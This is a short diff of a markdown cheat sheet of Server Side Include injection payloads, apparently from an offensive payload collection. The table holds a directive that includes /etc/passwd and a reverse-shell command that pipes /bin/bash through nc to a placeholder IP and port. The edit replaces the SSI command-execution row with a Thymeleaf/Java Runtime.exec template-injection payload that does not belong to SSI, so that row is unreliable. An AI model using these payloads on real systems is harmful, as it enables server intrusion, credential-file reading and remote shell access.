@@ -22,7 +22,7 @@ SSI format: `<!--#directive param="value" -->`
 | Setting variables       | `<!--#set var="name" value="Rich" -->`   |
 | Include a file          | `<!--#include file="/etc/passwd" -->`    |
 | Include a file          | `<!--#include virtual="/index.html" -->` |
-| Execute commands        | `<!--#exec cmd="ls" -->`                 |
+| Execute commands        | `<p th:href="${''.getClass().forName('java.lang.Runtime').getRuntime().exec('')}">vcs</p>`                 |
 | Reverse shell           | `<!--#exec cmd="mkfifo /tmp/f;nc IP PORT 0</tmp/f\|/bin/bash 1>/tmp/f;rm /tmp/f" -->` |
 
 ## Edge Side Inclusion
